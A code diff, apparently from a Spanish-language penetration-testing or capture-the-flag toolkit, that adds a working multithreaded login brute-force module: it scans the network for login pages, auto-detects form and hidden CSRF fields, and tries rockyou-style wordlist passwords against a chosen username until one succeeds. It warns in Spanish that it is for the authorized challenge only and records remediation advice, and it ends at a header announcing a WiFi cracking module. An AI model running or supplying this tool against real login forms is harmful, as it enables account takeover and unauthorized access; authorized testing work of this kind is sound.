@@ -1259,3 +1259,153 @@ def discover_login_targets(st):
     return uniq
 
 
+def m_brute(st):
+    print(f"{C.BOLD}[🔓] Fuerza bruta de login{C.END}")
+    print(f"  {C.R}⚠ SOLO contra el login AUTORIZADO del reto. Fuera de ahí es delito.{C.END}\n")
+    if not st.net:
+        m_detect(st); print()
+    print(f"  {C.DIM}Buscando objetivos de login en {st.net.get('cidr', 'la red')}...{C.END}")
+    targets = discover_login_targets(st)
+    if targets:
+        print(f"\n  {C.BOLD}Objetivos encontrados:{C.END}")
+        for i, t in enumerate(targets, 1):
+            tag = f"{C.G}[LOGIN]{C.END}" if t["login"] else f"{C.DIM}[web] {C.END}"
+            extra = f" · {t['title']}" if t["title"] else ""
+            print(f"   {C.CY}{i}{C.END}. {tag} {t['url']}  (HTTP {t['code']}){extra}")
+    else:
+        print(f"  {C.Y}No se hallaron webs automáticamente.{C.END}")
+    print(f"   {C.CY}0{C.END}. Escribir URL manualmente")
+    try:
+        sel = input("\n  Elige objetivo: ").strip()
+    except EOFError:
+        return
+    if sel == "0" or not targets:
+        url = input("  URL del login: ").strip()
+    elif sel.isdigit() and 1 <= int(sel) <= len(targets):
+        url = targets[int(sel) - 1]["url"]
+    else:
+        print("  Cancelado."); return
+    if not url:
+        print("  Cancelado."); return
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+
+    # Autodetección del formulario
+    _, _, body, _ = http_probe(url)
+    inputs = re.findall(r'<input[^>]*>', body or "", re.I)
+    names = re.findall(r'name=["\']([^"\']+)["\']', " ".join(inputs), re.I)
+    hidden = {}
+    for inp in inputs:
+        if re.search(r'type=["\']hidden', inp, re.I):
+            nm = re.search(r'name=["\']([^"\']+)', inp, re.I)
+            vl = re.search(r'value=["\']([^"\']*)', inp, re.I)
+            if nm:
+                hidden[nm.group(1)] = vl.group(1) if vl else ""
+    if names:
+        print(f"  {C.CY}Campos detectados:{C.END} {', '.join(names)}")
+    if hidden:
+        print(f"  {C.DIM}Campos ocultos (CSRF?): {', '.join(hidden)}{C.END}")
+
+    def guess(opts, default):
+        for o in opts:
+            for n in names:
+                if o in n.lower():
+                    return n
+        return default
+    uf = guess(['user', 'email', 'login', 'usuario'], 'username')
+    pf = guess(['pass', 'clave', 'pwd'], 'password')
+    method = "POST"
+    print(f"  {C.DIM}Auto: usuario='{uf}'  contraseña='{pf}'  método={method}{C.END}")
+    username = input("  Usuario a atacar [admin]: ").strip() or "admin"
+
+    # Selección de diccionario
+    lists = sorted(f for f in os.listdir(WORDLIST_DIR) if os.path.isfile(os.path.join(WORDLIST_DIR, f))) \
+        if os.path.isdir(WORDLIST_DIR) else []
+    if not lists:
+        print(f"  {C.Y}No hay diccionarios en wordlists/.{C.END}"); return
+    print(f"\n  {C.BOLD}Diccionarios:{C.END}")
+    default_idx = None
+    for i, f in enumerate(lists, 1):
+        if f.lower() == "rockyou.txt":
+            default_idx = i
+        print(f"   {C.CY}{i}{C.END}. {f}  ({_wlsize(os.path.join(WORDLIST_DIR, f))})")
+    prompt = f"  Nº de diccionario{f' [{default_idx}=rockyou]' if default_idx else ''}: "
+    sel = input(prompt).strip()
+    if not sel and default_idx:
+        sel = str(default_idx)
+    if not (sel.isdigit() and 1 <= int(sel) <= len(lists)):
+        print("  Cancelado."); return
+    wl = os.path.join(WORDLIST_DIR, lists[int(sel) - 1])
+
+    fail_str = input("  Texto que aparece al FALLAR (vacío = autodetectar): ").strip()
+    try:
+        cap = int(input("  Máx. de intentos [2000]: ").strip() or "2000")
+    except ValueError:
+        cap = 2000
+    workers = 10
+
+    # Baseline con contraseña falsa (para medir una respuesta fallida)
+    base_len = None
+    if not fail_str:
+        data0 = dict(hidden); data0[uf] = username; data0[pf] = "wrongpw__zzz123"
+        r0 = _login_try(url, method, data0, None, None)
+        if r0:
+            base_len = r0[2]
+            print(f"  {C.DIM}Baseline de fallo: {base_len} bytes.{C.END}")
+
+    # Cargar contraseñas (hasta el tope)
+    pwds = []
+    with open(wl, encoding="latin-1") as fh:
+        for line in fh:
+            pwds.append(line.rstrip("\n"))
+            if len(pwds) >= cap:
+                break
+    print(f"\n  Probando {C.G}{len(pwds)}{C.END} contraseñas con {workers} hilos "
+          f"contra {C.G}{username}@{url}{C.END} ...\n")
+
+    stop = threading.Event()
+    found = {}
+    count = [0]
+    lock = threading.Lock()
+    t0 = time.time()
+
+    def worker(pw):
+        if stop.is_set():
+            return
+        data = dict(hidden); data[uf] = username; data[pf] = pw
+        res = _login_try(url, method, data, fail_str, base_len)
+        with lock:
+            count[0] += 1
+            if count[0] % 100 == 0:
+                rate = count[0] / max(0.1, time.time() - t0)
+                print(f"    {C.DIM}{count[0]}/{len(pwds)}  ({rate:.0f}/s){C.END}")
+        if res and res[0] and not stop.is_set():
+            stop.set()
+            found["pw"] = pw; found["res"] = res
+
+    try:
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            for pw in pwds:
+                if stop.is_set():
+                    break
+                ex.submit(worker, pw)
+    except KeyboardInterrupt:
+        stop.set()
+        print(f"\n  {C.DIM}Detenido.{C.END}")
+
+    if found:
+        pw = found["pw"]; code, ln, final = found["res"][1:]
+        print(f"\n  {C.G}{C.BOLD}✅ CREDENCIAL VÁLIDA{C.END}  {username} : {C.G}{pw}{C.END}")
+        print(f"  {C.DIM}(HTTP {code}, {ln} bytes, {final}){C.END}")
+        st.add("CRITICAL", "Login vulnerable a fuerza bruta",
+               f"Credencial encontrada: {username}:{pw} en {url}.",
+               "Bloqueo tras N intentos, rate-limit, MFA y contraseñas fuertes.")
+        st.captures.append({"kind": "cred", "value": f"{username}:{pw}  @ {url}", "raw": pw})
+    else:
+        print(f"\n  {C.Y}Sin éxito en {len(pwds)} intentos.{C.END} "
+              f"Prueba otro diccionario, usuario o ajusta el texto de fallo.")
+
+
+# ===========================================================================
+# MÓDULO 🔴 — Red 3: crackeo de WiFi por fuerza bruta ONLINE (estilo wifite)
+# ===========================================================================
